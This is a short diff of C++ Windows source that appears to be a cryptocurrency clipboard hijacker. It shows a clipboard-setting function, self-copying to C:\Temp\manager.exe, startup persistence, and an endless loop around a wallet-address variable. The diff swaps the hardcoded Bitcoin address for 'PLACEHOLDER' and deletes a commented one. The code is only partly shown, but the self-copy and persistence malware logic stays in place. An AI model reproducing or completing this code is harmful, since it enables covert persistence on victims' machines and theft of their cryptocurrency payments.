@@ -7,8 +7,6 @@
 #include <filesystem>
 using namespace std;
 
-// 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
-
 void setClipboard(char newText[]) {
     const size_t len = strlen(newText) + 1;
     HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len);
@@ -64,7 +62,7 @@ void copy_self(char filename[], char save_path[], char create_path[]) {
 int main(int argc, char *argv[]) {
     char create_path[] = "C:\\Temp\\";
     char save_path[] = "C:\\Temp\\manager.exe";
-    char address[] = "bc1qlkt252pj7z4nfsq48maejm6k9054jsp5ulxz72";
+    char address[] = "PLACEHOLDER";
     copy_self(argv[0], save_path, create_path);
     addStartup(save_path);
     for ( ; ; ) {
